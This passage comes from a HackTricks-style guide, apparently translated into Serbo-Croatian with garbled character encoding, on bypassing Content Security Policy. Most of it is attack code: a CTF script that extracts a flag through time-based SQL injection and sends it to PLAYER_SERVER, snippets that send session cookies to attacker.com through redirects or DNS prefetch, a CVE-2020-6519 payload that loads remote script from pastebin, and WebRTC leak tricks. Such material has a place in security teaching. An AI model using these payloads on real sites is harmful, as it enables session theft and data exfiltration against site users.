Sa ovim preusmerenjem, Äak i ako je putanja potpuno specificirana, i dalje Ä‡e biti zaobiÄ‘ena.

Stoga, najbolje reÅ¡enje je da se obezbedi da veb sajt nema ranjivosti otvorenog preusmeravanja i da ne postoje domeni koji mogu biti iskoriÅ¡Ä‡eni u CSP pravilima.

### ZaobilaÅ¾enje CSP pomoÄ‡u viseÄ‡eg markupa

ProÄitajte [kako ovde](../dangling-markup-html-scriptless-injection/).

### 'unsafe-inline'; img-src \*; putem XSS-a
```
default-src 'self' 'unsafe-inline'; img-src *;
```
`'unsafe-inline'` znaÄi da moÅ¾ete izvrÅ¡iti bilo koji skript unutar koda (XSS moÅ¾e izvrÅ¡iti kod), a `img-src *` znaÄi da moÅ¾ete koristiti na web stranici bilo koju sliku sa bilo kojeg izvora.

MoÅ¾ete zaobiÄ‡i ovu CSP tako Å¡to Ä‡ete eksfiltrirati podatke putem slika (u ovom sluÄaju, XSS zloupotrebljava CSRF gde stranica kojoj bot ima pristup sadrÅ¾i SQLi i izvlaÄi zastavicu putem slike):
```javascript
<script>fetch('http://x-oracle-v0.nn9ed.ka0labs.org/admin/search/x%27%20union%20select%20flag%20from%20challenge%23').then(_=>_.text()).then(_=>new Image().src='http://PLAYER_SERVER/?'+_)</script>
```
Isto tako, moÅ¾ete zloupotrebiti ovu konfiguraciju da **uÄitate JavaScript kod ubaÄen unutar slike**. Na primer, ako stranica dozvoljava uÄitavanje slika sa Twittera, moÅ¾ete **napraviti** posebnu sliku, postaviti je na Twitter i iskoristiti "**unsafe-inline**" da biste izvrÅ¡ili JS kod (kao redovni XSS) koji Ä‡e **uÄitati** sliku, **izvuÄ‡i** JS iz nje i **izvrÅ¡iti** ga: [https://www.secjuice.com/hiding-javascript-in-png-csp-bypass/](https://www.secjuice.com/hiding-javascript-in-png-csp-bypass/)

### Sa servisnim radnicima

Funkcija **`importScripts`** servisnih radnika nije ograniÄena CSP-om:

{% content-ref url="../xss-cross-site-scripting/abusing-service-workers.md" %}
[abusing-service-workers.md](../xss-cross-site-scripting/abusing-service-workers.md)
{% endcontent-ref %}

### Ubacivanje politike

**IstraÅ¾ivanje:** [**https://portswigger.net/research/bypassing-csp-with-policy-injection**](https://portswigger.net/research/bypassing-csp-with-policy-injection)

#### Chrome

Ako se **parametar** koji ste poslali **ubacuje unutar** **deklaracije** **politike**, tada moÅ¾ete **izmeniti** politiku na naÄin koji je **beskoristan**. MoÅ¾ete **dozvoliti skriptu 'unsafe-inline'** sa bilo kojim od ovih zaobilaÅ¾enja:
```bash
script-src-elem *; script-src-attr *
script-src-elem 'unsafe-inline'; script-src-attr 'unsafe-inline'
```
Zato Å¡to Ä‡e ova direktiva **prepisati postojeÄ‡e direktive script-src**.\
Primjer moÅ¾ete pronaÄ‡i ovdje: [http://portswigger-labs.net/edge\_csp\_injection\_xndhfye721/?x=%3Bscript-src-elem+\*\&y=%3Cscript+src=%22http://subdomain1.portswigger-labs.net/xss/xss.js%22%3E%3C/script%3E](http://portswigger-labs.net/edge\_csp\_injection\_xndhfye721/?x=%3Bscript-src-elem+\*\&y=%3Cscript+src=%22http://subdomain1.portswigger-labs.net/xss/xss.js%22%3E%3C/script%3E)

#### Edge

U Edge-u je mnogo jednostavnije. Ako moÅ¾ete dodati u CSP samo ovo: **`;_`** **Edge** Ä‡e **odbaciti** cijelu **polisu**.\
Primjer: [http://portswigger-labs.net/edge\_csp\_injection\_xndhfye721/?x=;\_\&y=%3Cscript%3Ealert(1)%3C/script%3E](http://portswigger-labs.net/edge\_csp\_injection\_xndhfye721/?x=;\_\&y=%3Cscript%3Ealert\(1\)%3C/script%3E)

### img-src \*; putem XSS (iframe) - Napad vremenskim usporavanjem

Primijetite nedostatak direktive `'unsafe-inline'`\
Ovaj put moÅ¾ete natjerati Å¾rtvu da **uÄita** stranicu pod **vaÅ¡om kontrolom** putem **XSS-a** s `<iframe>`. Ovaj put Ä‡ete natjerati Å¾rtvu da pristupi stranici s koje Å¾elite izvuÄ‡i informacije (**CSRF**). Ne moÅ¾ete pristupiti sadrÅ¾aju stranice, ali ako na neki naÄin moÅ¾ete **kontrolirati vrijeme koje stranica treba za uÄitavanje**, moÅ¾ete izvuÄ‡i potrebne informacije.

Ovaj put Ä‡e se izvuÄ‡i **flag**, svaki put kad se **toÄno pogodi znak** putem SQLi, **odgovor** traje **duÅ¾e vrijeme** zbog funkcije sleep. Tada Ä‡ete moÄ‡i izvuÄ‡i flag:
```html
<!--code from https://github.com/ka0labs/ctf-writeups/tree/master/2019/nn9ed/x-oracle -->
<iframe name=f id=g></iframe> // The bot will load an URL with the payload
<script>
let host = "http://x-oracle-v1.nn9ed.ka0labs.org";
function gen(x) {
x = escape(x.replace(/_/g, '\\_'));
return `${host}/admin/search/x'union%20select(1)from%20challenge%20where%20flag%20like%20'${x}%25'and%201=sleep(0.1)%23`;
}

function gen2(x) {
x = escape(x);
return `${host}/admin/search/x'union%20select(1)from%20challenge%20where%20flag='${x}'and%201=sleep(0.1)%23`;
}

async function query(word, end=false) {
let h = performance.now();
f.location = (end ? gen2(word) : gen(word));
await new Promise(r => {
g.onload = r;
});
let diff = performance.now() - h;
return diff > 300;
}

let alphabet = '_abcdefghijklmnopqrstuvwxyz0123456789'.split('');
let postfix = '}'

async function run() {
let prefix = 'nn9ed{';
while (true) {
let i = 0;
for (i;i<alphabet.length;i++) {
let c = alphabet[i];
let t =  await query(prefix+c); // Check what chars returns TRUE or FALSE
console.log(prefix, c, t);
if (t) {
console.log('FOUND!')
prefix += c;
break;
}
}
if (i==alphabet.length) {
console.log('missing chars');
break;
}
let t = await query(prefix+'}', true);
if (t) {
prefix += '}';
break;
}
}
new Image().src = 'http://PLAYER_SERVER/?' + prefix; //Exfiltrate the flag
console.log(prefix);
}

run();
</script>
```
### Preko Bookmarklet-a

Ovaj napad podrazumeva neku vrstu socijalnog inÅ¾enjeringa gde napadaÄ **ubeÄ‘uje korisnika da prevuÄe i ispusti link preko bookmarklet-a u pregledaÄu**. Ovaj bookmarklet bi sadrÅ¾ao **zlonamerni JavaScript** kod koji bi se izvrÅ¡io u kontekstu trenutnog prozora veba kada se prevuÄe i klikne, **zaobilazeÄ‡i CSP i omoguÄ‡avajuÄ‡i kraÄ‘u osetljivih informacija** kao Å¡to su kolaÄiÄ‡i ili tokeni.

Za viÅ¡e informacija [**proverite originalni izveÅ¡taj ovde**](https://socradar.io/csp-bypass-unveiled-the-hidden-threat-of-bookmarklets/).

### ZaobilaÅ¾enje CSP ograniÄenjem CSP-a

U [**ovom CTF izveÅ¡taju**](https://github.com/google/google-ctf/tree/master/2023/web-biohazard/solution), CSP je zaobiÄ‘en ubacivanjem restriktivnijeg CSP-a unutar dozvoljenog iframe-a koji onemoguÄ‡ava uÄitavanje odreÄ‘ene JS datoteke koja, zatim, putem **zagaÄ‘ivanja prototipa** ili **zagaÄ‘ivanja DOM-a** omoguÄ‡ava **zloupotrebu drugog skripta za uÄitavanje proizvoljnog skripta**.

MoÅ¾ete **ograniÄiti CSP iframe-a** pomoÄ‡u atributa **`csp`**:

{% code overflow="wrap" %}
```html
<iframe src="https://biohazard-web.2023.ctfcompetition.com/view/[bio_id]" csp="script-src https://biohazard-web.2023.ctfcompetition.com/static/closure-library/ https://biohazard-web.2023.ctfcompetition.com/static/sanitizer.js https://biohazard-web.2023.ctfcompetition.com/static/main.js 'unsafe-inline' 'unsafe-eval'"></iframe>
```
{% endcode %}

U [**ovom CTF izveÅ¡taju**](https://github.com/aszx87410/ctf-writeups/issues/48), bilo je moguÄ‡e putem **HTML ubacivanja** ograniÄiti **CSP** tako da je skripta koja spreÄava CSTI bila onemoguÄ‡ena i samim tim je **ranjivost postala iskoristiva**.\
CSP moÅ¾e biti postavljen restriktivnije koriÅ¡Ä‡enjem **HTML meta tagova**, a inline skripte mogu biti onemoguÄ‡ene **uklanjanjem** unosa koji dozvoljava njihov **nonce** i **omoguÄ‡avanje specifiÄne inline skripte putem sha**:
```html
<meta http-equiv="Content-Security-Policy" content="script-src 'self'
'unsafe-eval' 'strict-dynamic'
'sha256-whKF34SmFOTPK4jfYDy03Ea8zOwJvqmz%2boz%2bCtD7RE4='
'sha256-Tz/iYFTnNe0de6izIdG%2bo6Xitl18uZfQWapSbxHE6Ic=';">
```
### JS eksfiltracija pomoÄ‡u Content-Security-Policy-Report-Only

Ako uspete da naterate server da odgovori sa zaglavljem **`Content-Security-Policy-Report-Only`** sa **vrednoÅ¡Ä‡u koju kontroliÅ¡ete** (moÅ¾da zbog CRLF), moÅ¾ete ga naterati da upuÄ‡uje na vaÅ¡ server i ako **obuhvatite** JS sadrÅ¾aj koji Å¾elite da eksfiltrirate sa **`<script>`** i zato Å¡to je vrlo verovatno da `unsafe-inline` nije dozvoljen prema CSP, ovo Ä‡e **izazvati CSP greÅ¡ku** i deo skripta (koji sadrÅ¾i osetljive informacije) Ä‡e biti poslat serveru iz `Content-Security-Policy-Report-Only`.

Za primer [**proverite ovaj CTF writeup**](https://github.com/maple3142/My-CTF-Challenges/tree/master/TSJ%20CTF%202022/Nim%20Notes).

### [CVE-2020-6519](https://www.perimeterx.com/tech-blog/2020/csp-bypass-vuln-disclosure/)
```javascript
document.querySelector('DIV').innerHTML="<iframe src='javascript:var s = document.createElement(\"script\");s.src = \"https://pastebin.com/raw/dw5cWGK6\";document.body.appendChild(s);'></iframe>";
```
### Otkrivanje informacija pomoÄ‡u CSP i Iframe

- Kreira se `iframe` koji pokazuje na URL (nazovimo ga `https://example.redirect.com`) koji je dozvoljen od strane CSP-a.
- Taj URL zatim preusmerava na tajni URL (npr. `https://usersecret.example2.com`) koji **nije dozvoljen** od strane CSP-a.
- SluÅ¡anjem dogaÄ‘aja `securitypolicyviolation`, moguÄ‡e je uhvatiti svojstvo `blockedURI`. Ovo svojstvo otkriva domen blokiranog URI-ja, otkrivajuÄ‡i tajni domen na koji je prvobitni URL preusmeren.

Zanimljivo je napomenuti da pregledaÄi poput Chrome-a i Firefox-a imaju razliÄito ponaÅ¡anje prilikom rukovanja iframe-ovima u vezi sa CSP-om, Å¡to moÅ¾e dovesti do potencijalnog otkrivanja osetljivih informacija zbog nedefinisanog ponaÅ¡anja.

JoÅ¡ jedna tehnika ukljuÄuje iskoriÅ¡Ä‡avanje samog CSP-a kako bi se zakljuÄio tajni poddomen. Ova metoda se oslanja na binarnu pretragu i prilagoÄ‘avanje CSP-a kako bi se ukljuÄili odreÄ‘eni domeni koji su namerno blokirani. Na primer, ako je tajni poddomen sastavljen od nepoznatih karaktera, moÅ¾ete iterativno testirati razliÄite poddomene tako Å¡to Ä‡ete menjati CSP direktivu da blokira ili dozvoli ove poddomene. Evo iseÄka koji prikazuje kako bi CSP mogao biti podeÅ¡en da olakÅ¡a ovu metodu:
```markdown
img-src https://chall.secdriven.dev https://doc-1-3213.secdrivencontent.dev https://doc-2-3213.secdrivencontent.dev ... https://doc-17-3213.secdriven.dev
```
PrateÄ‡i koje zahteve CSP blokira ili dozvoljava, moguÄ‡e je suziti moguÄ‡e karaktere u tajnom poddomenu i na kraju otkriti punu URL adresu.

Oba metoda iskoriÅ¡Ä‡avaju nijanse implementacije i ponaÅ¡anja CSP-a u pregledaÄima, pokazujuÄ‡i kako se naizgled sigurne politike mogu nenamerno otkriti osetljive informacije.

Triks sa [**ovde**](https://ctftime.org/writeup/29310).

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

PridruÅ¾ite se serveru [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) kako biste komunicirali sa iskusnim hakerima i lovcima na bagove!

**Hakerski uvidi**\
UkljuÄite se u sadrÅ¾aj koji istraÅ¾uje uzbuÄ‘enje i izazove hakovanja

**Hakerske vesti u realnom vremenu**\
Budite u toku sa brzim svetom hakovanja putem vesti i uvida u realnom vremenu

**Najnovije objave**\
Budite informisani o najnovijim nagradama za pronalaÅ¾enje bagova i vaÅ¾nim aÅ¾uriranjima platforme

**PridruÅ¾ite nam se na** [**Discord-u**](https://discord.com/invite/N3FrSbmwdy) i poÄnite da saraÄ‘ujete sa vrhunskim hakerima danas!

## Nesigurne tehnologije za zaobilaÅ¾enje CSP-a

### PreoptereÄ‡enje PHP odgovora baferom

PHP je poznat po tome Å¡to podrazumevano **baferuje odgovor do 4096** bajtova. Stoga, ako PHP prikazuje upozorenje, pruÅ¾anjem **dovoljno podataka unutar upozorenja**, **odgovor Ä‡e biti poslat pre** **CSP zaglavlja**, Å¡to dovodi do ignorisanja zaglavlja.\
Zatim, tehnika se sastoji u suÅ¡tini u **popunjavanju bafera odgovora upozorenjima** kako bi CSP zaglavlje nije poslato.

Ideja preuzeta sa [**ovog writeup-a**](https://hackmd.io/@terjanq/justCTF2020-writeups#Baby-CSP-web-6-solves-406-points).

### Prepravljanje stranice sa greÅ¡kom

Iz [**ovog writeup-a**](https://blog.ssrf.kr/69) izgleda da je bilo moguÄ‡e zaobiÄ‡i CSP zaÅ¡titu uÄitavanjem stranice sa greÅ¡kom (potencijalno bez CSP-a) i prepravljanjem njenog sadrÅ¾aja.
```javascript
a = window.open('/' + 'x'.repeat(4100));
setTimeout(function() {
a.document.body.innerHTML = `<img src=x onerror="fetch('https://filesharing.m0lec.one/upload/ffffffffffffffffffffffffffffffff').then(x=>x.text()).then(x=>fetch('https://enllwt2ugqrt.x.pipedream.net/'+x))">`;
}, 1000);
```
### SOME + 'self' + wordpress

SOME je tehnika koja zloupotrebljava XSS (ili veoma ograniÄeni XSS) **na kraju stranice** kako bi **zloupotrebila** **druge krajnje taÄke istog porekla.** Ovo se postiÅ¾e uÄitavanjem ranjive krajnje taÄke sa stranice napadaÄa, a zatim osveÅ¾avanjem stranice napadaÄa do stvarne krajnje taÄke u istom poreklu koju Å¾elite zloupotrebiti. Na ovaj naÄin, **ranjiva krajnja taÄka** moÅ¾e koristiti objekat **`opener`** u **payload-u** da bi **pristupila DOM-u** stvarne krajnje taÄke koju Å¾elite zloupotrebiti. Za viÅ¡e informacija pogledajte:

{% content-ref url="../xss-cross-site-scripting/some-same-origin-method-execution.md" %}
[some-same-origin-method-execution.md](../xss-cross-site-scripting/some-same-origin-method-execution.md)
{% endcontent-ref %}

Osim toga, **wordpress** ima JSONP krajnju taÄku u `/wp-json/wp/v2/users/1?_jsonp=data` koja Ä‡e **reflektovati** **podatke** poslate u izlazu (sa ograniÄenjem samo slova, brojeva i taÄaka).

NapadaÄ moÅ¾e zloupotrebiti tu krajnju taÄku da bi **izveo SOME napad** na WordPress i **ugradio** ga unutar `<script s`rc=`/wp-json/wp/v2/users/1?_jsonp=some_attack></script>` obratite paÅ¾nju da Ä‡e se ovaj **skript** **uÄitati** jer je **dozvoljen od strane 'self'**. Osim toga, zbog instaliranog WordPress-a, napadaÄ moÅ¾e zloupotrebiti **SOME napad** putem **ranjive** **callback** krajnje taÄke koja **zaobilazi CSP** kako bi korisniku dala viÅ¡e privilegija, instalirala novi dodatak...
Za viÅ¡e informacija o tome kako izvesti ovaj napad pogledajte [https://octagon.net/blog/2022/05/29/bypass-csp-using-wordpress-by-abusing-same-origin-method-execution/](https://octagon.net/blog/2022/05/29/bypass-csp-using-wordpress-by-abusing-same-origin-method-execution/)

## Bypass-ovi CSP eksfiltracije

Ako postoji strogi CSP koji vam ne dozvoljava da **interagujete sa spoljnim serverima**, postoje neke stvari koje uvek moÅ¾ete uraditi da biste eksfiltrirali informacije.

### Location

Jednostavno moÅ¾ete aÅ¾urirati lokaciju kako biste poslali tajne informacije na server napadaÄa:
```javascript
var sessionid = document.cookie.split('=')[1]+".";
document.location = "https://attacker.com/?" + sessionid;
```
### Meta oznaka

MoÅ¾ete preusmeriti ubrizgavanjem meta oznake (ovo je samo preusmeravanje, neÄ‡e procuriti sadrÅ¾aj)
```html
<meta http-equiv="refresh" content="1; http://attacker.com">
```
### DNS Prefetch

Da biste ubrzali uÄitavanje stranica, pregledaÄi unapred reÅ¡avaju imena hostova u IP adrese i keÅ¡iraju ih za kasniju upotrebu. 
MoÅ¾ete navesti pregledaÄ da unapred reÅ¡ava ime hosta koristeÄ‡i: `<link reol="dns-prefetch" href="something.com">`

MoÅ¾ete zloupotrebiti ovu funkcionalnost da **izfiltrirate osetljive informacije putem DNS zahteva**:
```javascript
var sessionid = document.cookie.split('=')[1]+".";
var body = document.getElementsByTagName('body')[0];
body.innerHTML = body.innerHTML + "<link rel=\"dns-prefetch\" href=\"//" + sessionid + "attacker.ch\">";
```
JoÅ¡ jedan naÄin:
```javascript
const linkEl = document.createElement('link');
linkEl.rel = 'prefetch';
linkEl.href = urlWithYourPreciousData;
document.head.appendChild(linkEl);
```
Da biste to izbegli, server moÅ¾e poslati HTTP zaglavlje:
```
X-DNS-Prefetch-Control: off
```
{% hint style="info" %}
OÄigledno, ova tehnika ne funkcioniÅ¡e u headless browserima (botovima).
{% endhint %}

### WebRTC

Na nekoliko stranica moÅ¾ete proÄitati da **WebRTC ne proverava `connect-src` politiku** CSP-a.

Zapravo, moÅ¾ete _procuriti_ informacije koristeÄ‡i _DNS zahtev_. Pogledajte ovaj kod:
```javascript
(async()=>{p=new RTCPeerConnection({iceServers:[{urls: "stun:LEAK.dnsbin"}]});p.createDataChannel('');p.setLocalDescription(await p.createOffer())})()
```
Druga opcija:
```javascript
var pc = new RTCPeerConnection({
"iceServers":[
{"urls":[
"turn:74.125.140.127:19305?transport=udp"
],"username":"_all_your_data_belongs_to_us",
"credential":"."
}]
});
pc.createOffer().then((sdp)=>pc.setLocalDescription(sdp);
```
## Provera CSP politika online

* [https://csp-evaluator.withgoogle.com/](https://csp-evaluator.withgoogle.com)
* [https://cspvalidator.org/](https://cspvalidator.org/#url=https://cspvalidator.org/)

## Automatsko kreiranje CSP

[https://csper.io/docs/generating-content-security-policy](https://csper.io/docs/generating-content-security-policy)

## Reference

* [https://hackdefense.com/publications/csp-the-how-and-why-of-a-content-security-policy/](https://hackdefense.com/publications/csp-the-how-and-why-of-a-content-security-policy/)
* [https://lcamtuf.coredump.cx/postxss/](https://lcamtuf.coredump.cx/postxss/)
* [https://bhavesh-thakur.medium.com/content-security-policy-csp-bypass-techniques-e3fa475bfe5d](https://bhavesh-thakur.medium.com/content-security-policy-csp-bypass-techniques-e3fa475bfe5d)
* [https://0xn3va.gitbook.io/cheat-sheets/web-application/content-security-policy#allowed-data-scheme](https://0xn3va.gitbook.io/cheat-sheets/web-application/content-security-policy#allowed-data-scheme)
* [https://www.youtube.com/watch?v=MCyPuOWs3dg](https://www.youtube.com/watch?v=MCyPuOWs3dg)
* [https://aszx87410.github.io/beyond-xss/en/ch2/csp-bypass/](https://aszx87410.github.io/beyond-xss/en/ch2/csp-bypass/)
* [https://lab.wallarm.com/how-to-trick-csp-in-letting-you-run-whatever-you-want-73cb5ff428aa/](https://lab.wallarm.com/how-to-trick-csp-in-letting-you-run-whatever-you-want-73cb5ff428aa/)


â€‹

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

PridruÅ¾ite se [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) serveru kako biste komunicirali sa iskusnim hakerima i lovcima na bagove!

**Hacking Insights**\
UkljuÄite se u sadrÅ¾aj koji istraÅ¾uje uzbuÄ‘enje i izazove hakovanja

**Real-Time Hack News**\
Budite u toku sa brzim svetom hakovanja kroz vesti i uvide u realnom vremenu

**Latest Announcements**\
Budite informisani o najnovijim nagradama za pronalaÅ¾enje bagova i vaÅ¾nim aÅ¾uriranjima platforme

**PridruÅ¾ite nam se na** [**Discord-u**](https://discord.com/invite/N3FrSbmwdy) i poÄnite da saraÄ‘ujete sa vrhunskim hakerima danas!

<details>

<summary><strong>NauÄite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi naÄini podrÅ¡ke HackTricks-u:

* Ako Å¾elite da vidite **oglaÅ¡avanje vaÅ¡e kompanije u HackTricks-u** ili **preuzmete HackTricks u PDF formatu** Pogledajte [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvaniÄni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), naÅ¡u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **PridruÅ¾ite se** ğŸ’¬ [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje trikove hakovanja slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
